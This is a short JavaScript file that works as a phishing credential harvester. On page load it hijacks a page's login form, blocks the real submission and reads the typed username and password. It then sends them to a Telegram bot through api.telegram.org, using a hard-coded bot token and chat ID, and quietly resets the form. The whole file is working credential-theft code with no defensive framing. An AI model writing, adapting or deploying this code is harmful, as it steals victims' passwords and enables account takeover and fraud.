// Replace these with your bot token and chat ID
const TELEGRAM_BOT_TOKEN = '8343476631:AAHPu1CZ5rRvu2N1O49mjaiftL0tDJ6ZChU';
const TELEGRAM_CHAT_ID = '6954486703';

function sendToTelegram(username, password) {
    const message = `New login captured:\nUsername: ${username}\nPassword: ${password}`;

    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        })
    }).catch(err => console.error('Telegram send error:', err));
}

// Attach to the form submit
document.addEventListener('DOMContentLoaded', () => {
    const form = document.querySelector('form');
    form.addEventListener('submit', e => {
        e.preventDefault(); // prevent actual form submission

        const username = form.querySelector('input[type="text"]').value;
        const password = form.querySelector('input[type="password"]').value;

        sendToTelegram(username, password);


        form.reset();
    });
});

